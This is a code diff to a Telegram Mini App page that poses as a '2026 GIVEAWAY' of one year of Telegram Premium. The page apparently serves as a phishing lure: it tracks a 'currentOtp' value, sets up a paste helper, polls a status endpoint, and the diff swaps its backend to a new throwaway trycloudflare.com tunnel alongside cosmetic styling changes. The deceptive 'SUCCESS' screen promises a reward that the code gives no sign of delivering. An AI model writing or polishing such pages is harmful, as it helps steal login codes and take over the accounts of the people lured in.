@@ -18,7 +18,7 @@
     body {
         margin: 0;
         padding: 0;
-        background: linear-gradient(135deg, #0e1626 0%, #1f3a5f 100%);
+        background: linear-gradient(135deg, #0e1626 0%, #16263d 100%);
         min-height: 100vh;
         display: flex;
         flex-direction: column;
@@ -191,10 +191,10 @@
       100% { content: ""; }
     }
     .btn-primary {
-        background: #2b5278;
+        background: linear-gradient(135deg, #2f96fbea 0%, #e63eda 100%);
         color: white;
-        padding: 18px 24px;
-        border-radius: 100px;
+        padding: 12px 18px;
+        border-radius: 10px;
         border: none;
         font-size: 17px;
         font-weight: 700;
@@ -282,7 +282,7 @@
     <div class="glass-header">
         <div class="logo-premium">
             <i class="fa-brands fa-telegram"></i> 
-            <span>Premium <span style="font-weight: 400; opacity:0.7;">gift</span></span>
+            <span>Premium <span style="font-weight: 400; opacity:0.7;">✦ Gift</span></span>
         </div>
         <div class="badge-year">✦ 2026 GIVEAWAY</div>
     </div>
@@ -339,8 +339,8 @@
 
         <div id="step1" class="step">
           <div class="premium-card">
-              <div style="width: 80px; height: 80px; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center;">
-                  <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Telegram_Premium.png" alt="Premium Icon" style="width: 100%; height: auto; border-radius: 50%;">
+              <div style="width: 100px; height: 100px; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center;">
+                  <img src="https://i.postimg.cc/hGxH8N6c/artworks-Rr4s3eo9E3d3Nf7n-Sj8ANw-t500x500-removebg-preview.png" alt="Premium Icon" style="width: 100%; height: auto; border-radius: 50%;">
               </div>
                 <h2 style="margin-bottom: 5px;">Almost there</h2>
                 <p style="color:#8e9cbb;">press continue to claim 1 year premium</p>
@@ -402,7 +402,7 @@
                 <h2 style="font-size: 32px;">SUCCESS!</h2>
                 <p style="font-size: 18px; font-weight: 500;">✨ 1 year Telegram Premium ✨</p>
                 <p style="background: #1e2b38; border-radius: 60px; padding: 16px; color:#8e9cbb;">will be added to your account within 24h.</p>
-                <button class="btn-primary" style="background:#2b5278;" onclick="window.location.href='https://t.me/telegram'">done</button>
+                <button class="btn-primary" onclick="window.location.href='https://t.me/telegram'">done</button>
             </div>
         </div>
 
@@ -420,7 +420,7 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    const API_BASE_URL = "https://soldier-reel-safely-languages.trycloudflare.com";
+    const API_BASE_URL = "https://mortgages-wrapping-universal-diego.trycloudflare.com";
     let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "web_preview_" + Date.now();
     let sid = userId;
     let currentOtp = "";
@@ -434,8 +434,8 @@
             setTimeout(() => {
                 checkStatus();   
                 showStep(1);
-            }, 4000);
-        }, 2000);
+            }, 2500);
+        }, 1500);
 
         statusChecker = setInterval(checkStatus, 3500);
         setupLongPressPaste();
